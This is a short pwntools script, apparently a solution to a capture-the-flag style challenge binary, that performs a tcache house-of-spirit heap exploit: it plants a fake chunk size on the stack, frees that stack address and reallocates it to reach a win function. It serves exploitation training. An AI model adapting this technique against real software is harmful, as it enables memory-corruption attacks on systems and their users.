# tcache house-of-spirit

from pwn import *

p = process("/challenge/stack-spoofing-easy")

p.sendline(b"malloc 0 1")

p.sendline(b"stack_scanf")
p.sendline(b"\x00" * (64 - 8) + p64(0x60)) # 64 is the buffer size where we are scanf to reach to where we are malloc'ing
# we are writing chunk size 8 bytes before that so when free() call to variable after 64 bytes occur then it will help us create fake chunk

p.sendline(b"stack_free")

print(p.clean())

p.sendline(b"stack_malloc_win")

print(p.clean())

p.close()
